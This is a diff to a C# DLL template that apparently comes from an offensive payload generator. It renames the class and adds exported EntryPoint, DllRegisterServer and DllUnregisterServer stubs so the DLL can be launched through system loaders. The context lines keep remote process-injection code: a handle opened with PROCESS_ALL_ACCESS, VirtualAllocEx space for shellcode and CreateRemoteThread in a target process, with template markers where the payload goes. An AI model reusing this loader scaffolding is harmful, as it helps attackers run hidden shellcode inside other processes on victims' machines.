@@ -1,7 +1,6 @@
 using System;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
-using System.EnterpriseServices;
 
 //####STRONG_NAME_REQUIRED####
 
@@ -11,24 +10,36 @@ using System.EnterpriseServices;
 
 //####CODE####
 
-namespace ComDll
+
+namespace OdDll
 {
 
-    public class ComEDll : ServicedComponent
+    
+    [ComVisible(true)]
+    [Guid("EAF4F4FC-1499-4174-8A3C-937FB7C75192")]  // Generate a new GUID
+    [ClassInterface(ClassInterfaceType.None)]
+    public class OdClass
     {
-        [ComRegisterFunction] 
-        public static void DllRegisterServer(string key)
+        [DllImport("kernel32")]
+        public static extern bool AllocConsole();
+
+        [DllExport("EntryPoint", CallingConvention = CallingConvention.Cdecl)]
+        public static void EntryPoint(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow)
         {
-            Console.WriteLine("DllRegisterServer");
-            ComConDll.COMDllDo(); 
+            Console.WriteLine("Hello There From EntryPoint");
         }
 
-        [ComUnregisterFunction] //This executes if registration fails
-		public static void UnRegisterClass ( string key )
-		{
-            Console.WriteLine("DllUnregisterServer");
-            ComConDll.COMDllDo(); 
-		}
+        [DllExport("DllRegisterServer", CallingConvention = CallingConvention.StdCall)]
+        public static void DllRegisterServer()
+        {
+            Console.WriteLine("Hello There From DllRegisterServer");
+        }
+
+        [DllExport("DllUnregisterServer", CallingConvention = CallingConvention.StdCall)]
+        public static void DllUnregisterServer()
+        {
+            Console.WriteLine("Hello There From DllUnregisterServer");
+        }
     }
 
 
@@ -104,27 +115,6 @@ namespace ComDll
             
         private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
 
-        public static bool DllRegisterServer()
-        {
-            Console.WriteLine("DllRegisterServer");
-            COMDllDo(); 
-            return true;
-        }
-    
-        public static bool DllUnregisterServer()
-        {
-            Console.WriteLine("DllUnregisterServer");
-            COMDllDo(); 
-            return true;
-        }
-    
-        public static void DllInstall(bool bInstall, IntPtr a)
-        {
-            Console.WriteLine("DllInstall");
-            COMDllDo(); 
-           
-        }
-
         
         public static void COMDllDo()
         {
@@ -135,7 +125,7 @@ namespace ComDll
 
             //####CALL####
 
-            //####INJECTION####
+            //####INJECTION#### 
             
             // Allocate RW space for shellcode in target process
             IntPtr lpBaseAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, PageReadWrite);
@@ -150,8 +140,6 @@ namespace ComDll
 
             // Create remote thread in target process
             IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, lpBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
-
-
         }
     }
 }
